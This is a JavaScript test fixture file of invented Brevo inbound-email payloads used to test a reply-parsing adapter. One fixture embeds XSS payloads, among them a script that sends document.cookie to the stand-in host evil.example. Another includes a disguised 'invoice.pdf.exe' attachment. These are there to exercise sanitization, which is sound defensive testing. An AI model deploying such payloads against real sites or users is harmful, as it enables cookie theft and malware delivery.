/**
 * Brevo inbound parse fixtures.
 *
 * SANITIZED. Every address, name, property and Message-ID here is invented.
 * There is no real seller data in this file and none may ever be added: a test
 * fixture is the easiest place in a repository for production PII to end up and
 * the hardest place to notice it.
 *
 * Shapes follow Brevo's documented inbound parse payload, including the field
 * spellings that differ across their API revisions -- which is the whole reason
 * the adapter reads several spellings per field rather than betting on one.
 */

const REPLY_TOKEN = "r1.0123456789abcdef0123456789abcdef";
const REPLY_ADDRESS = `${REPLY_TOKEN}@reply.example.com`;

/** An ordinary plain-text reply arriving on a reply alias. */
export const plainTextReply = () => ({
  Uuid: "11111111-1111-4111-8111-111111111111",
  MessageId: "<seller-reply-001@mail.example.net>",
  InReplyTo: "<outbound-001@reply.example.com>",
  References: "<outbound-001@reply.example.com>",
  From: { Address: "seller@example.net", Name: "Sam Seller" },
  To: [{ Address: REPLY_ADDRESS, Name: "Acquisitions" }],
  RecipientAddress: REPLY_ADDRESS,
  Subject: "Re: About your property on Elm Street",
  RawTextBody: "Yes, I would consider an offer. What did you have in mind?\n\nOn Mon, 8 Sep 2026, Acquisitions wrote:\n> Would you consider selling?",
  ReceivedAt: "2026-09-08T18:05:00Z",
  Attachments: [],
  Headers: { "message-id": "<seller-reply-001@mail.example.net>", date: "Mon, 8 Sep 2026 18:05:00 +0000" },
});

/** HTML only, no text part -- common from webmail clients. */
export const htmlOnlyReply = () => ({
  Uuid: "22222222-2222-4222-8222-222222222222",
  MessageId: "<seller-reply-002@mail.example.net>",
  From: { Address: "seller@example.net", Name: "Sam Seller" },
  RecipientAddress: REPLY_ADDRESS,
  Subject: "Re: About your property",
  RawHtmlBody: "<html><body><p>Sure, call me at 5pm.</p><p>Thanks,<br>Sam</p></body></html>",
  ReceivedAt: "2026-09-08T18:06:00Z",
  Headers: {},
});

/** Both parts present. The text part must win: converting HTML is always lossy. */
export const textAndHtmlReply = () => ({
  Uuid: "33333333-3333-4333-8333-333333333333",
  MessageId: "<seller-reply-003@mail.example.net>",
  From: { Address: "seller@example.net" },
  RecipientAddress: REPLY_ADDRESS,
  Subject: "Re: About your property",
  RawTextBody: "Plain text version.",
  RawHtmlBody: "<p>HTML version.</p>",
  ReceivedAt: "2026-09-08T18:07:00Z",
  Headers: {},
});

/** Hostile markup. Every payload here has been seen in the wild. */
export const maliciousHtmlReply = () => ({
  Uuid: "44444444-4444-4444-8444-444444444444",
  MessageId: "<seller-reply-004@mail.example.net>",
  From: { Address: "attacker@example.org" },
  RecipientAddress: REPLY_ADDRESS,
  Subject: "Re: About your property",
  RawHtmlBody:
    '<script>fetch("https://evil.example/"+document.cookie)</script>' +
    '<img src=x onerror="alert(1)">' +
    '<a href="javascript:alert(1)">click me</a>' +
    '<iframe src="https://evil.example"></iframe>' +
    "<p>Interested, call me.</p>",
  ReceivedAt: "2026-09-08T18:08:00Z",
  Headers: {},
});

/** RFC 3834 out-of-office. Note it QUOTES our message, which is the trap. */
export const outOfOfficeReply = () => ({
  Uuid: "55555555-5555-4555-8555-555555555555",
  MessageId: "<ooo-001@mail.example.net>",
  From: { Address: "seller@example.net", Name: "Sam Seller" },
  RecipientAddress: REPLY_ADDRESS,
  Subject: "Automatic reply: About your property",
  RawTextBody: "I am out of the office until Monday.\n\n> Would you consider an offer on 123 Elm St?",
  ReceivedAt: "2026-09-08T18:09:00Z",
  Headers: { "auto-submitted": "auto-replied", "x-auto-response-suppress": "All" },
});

/** A bounce. Must not be confused with an auto-reply, or the bounce is lost. */
export const deliveryStatusNotification = () => ({
  Uuid: "66666666-6666-4666-8666-666666666666",
  MessageId: "<dsn-001@mail.example.net>",
  From: { Address: "MAILER-DAEMON@mail.example.net" },
  RecipientAddress: REPLY_ADDRESS,
  Subject: "Undeliverable: About your property",
  RawTextBody: "Your message could not be delivered.",
  ReceivedAt: "2026-09-08T18:10:00Z",
  Headers: { "content-type": "multipart/report; report-type=delivery-status", "return-path": "<>" },
});

/** Mailing-list mail, identified by standard List-* headers. */
export const listMail = () => ({
  Uuid: "77777777-7777-4777-8777-777777777777",
  MessageId: "<list-001@lists.example.org>",
  From: { Address: "newsletter@lists.example.org" },
  RecipientAddress: REPLY_ADDRESS,
  Subject: "This week in real estate",
  RawTextBody: "Market update.",
  ReceivedAt: "2026-09-08T18:11:00Z",
  Headers: { "list-id": "<news.lists.example.org>", "list-unsubscribe": "<mailto:x@lists.example.org>" },
});

export const replyWithAttachment = () => ({
  Uuid: "88888888-8888-4888-8888-888888888888",
  MessageId: "<seller-reply-005@mail.example.net>",
  From: { Address: "seller@example.net" },
  RecipientAddress: REPLY_ADDRESS,
  Subject: "Re: About your property",
  RawTextBody: "Here is the payoff statement.",
  ReceivedAt: "2026-09-08T18:12:00Z",
  Attachments: [
    {
      Name: "payoff-statement.pdf",
      ContentType: "application/pdf",
      ContentLength: 12,
      // Inlined so the fixture needs no network.
      Content: Buffer.from("fake pdf pdf").toString("base64"),
    },
  ],
  Headers: {},
});

export const replyWithMultipleAttachments = () => ({
  ...replyWithAttachment(),
  Uuid: "99999999-9999-4999-8999-999999999999",
  MessageId: "<seller-reply-006@mail.example.net>",
  Attachments: [
    { Name: "front.jpg", ContentType: "image/jpeg", Content: Buffer.from("front photo").toString("base64") },
    { Name: "back.jpg", ContentType: "image/jpeg", Content: Buffer.from("back photo").toString("base64") },
    // A disguised executable, with a right-to-left override in the name.
    { Name: "invoice.pdf.exe", ContentType: "application/pdf", Content: Buffer.from("MZ fake").toString("base64") },
  ],
});

/** No provider Uuid: forces the deterministic fallback event key. */
export const replyWithoutProviderId = () => {
  const item = plainTextReply();
  delete item.Uuid;
  item.MessageId = "<seller-reply-007@mail.example.net>";
  return item;
};

/** Replied to the sender address rather than the alias. */
export const replyToSenderAddressNotAlias = () => ({
  ...plainTextReply(),
  Uuid: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
  MessageId: "<seller-reply-008@mail.example.net>",
  To: [{ Address: "acquisitions@example.com" }],
  RecipientAddress: "acquisitions@example.com",
  InReplyTo: null,
  References: null,
});

/** A well-formed token that maps to nothing. */
export const unknownReplyToken = () => ({
  ...plainTextReply(),
  Uuid: "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
  MessageId: "<seller-reply-009@mail.example.net>",
  RecipientAddress: "r1.ffffffffffffffffffffffffffffffff@reply.example.com",
  To: [{ Address: "r1.ffffffffffffffffffffffffffffffff@reply.example.com" }],
});

export const forwardedMessage = () => ({
  ...plainTextReply(),
  Uuid: "cccccccc-cccc-4ccc-8ccc-cccccccccccc",
  MessageId: "<seller-reply-010@mail.example.net>",
  Subject: "Fwd: About your property",
  RawTextBody: "See below.\n\n---------- Forwarded message ---------\nFrom: Acquisitions\nWould you consider selling?",
});

/** Non-ASCII throughout: name, subject and body. */
export const unicodeReply = () => ({
  ...plainTextReply(),
  Uuid: "dddddddd-dddd-4ddd-8ddd-dddddddddddd",
  MessageId: "<seller-reply-011@mail.example.net>",
  From: { Address: "vendedor@example.net", Name: "Jose Munoz" },
  Subject: "Re: Su propiedad en la calle Olmo",
  RawTextBody: "Si, me interesa. Cuanto ofrecen? Saludos cordiales.",
});

/** No sender at all. Must refuse rather than produce a blank message. */
export const malformedNoSender = () => ({
  Uuid: "eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee",
  Subject: "Re: About your property",
  RawTextBody: "hello",
  Headers: {},
});

export const emptyBodyReply = () => ({
  ...plainTextReply(),
  Uuid: "ffffffff-ffff-4fff-8fff-ffffffffffff",
  MessageId: "<seller-reply-012@mail.example.net>",
  RawTextBody: "",
  RawHtmlBody: "",
});

export const REPLY_TOKEN_FIXTURE = REPLY_TOKEN;
export const REPLY_ADDRESS_FIXTURE = REPLY_ADDRESS;
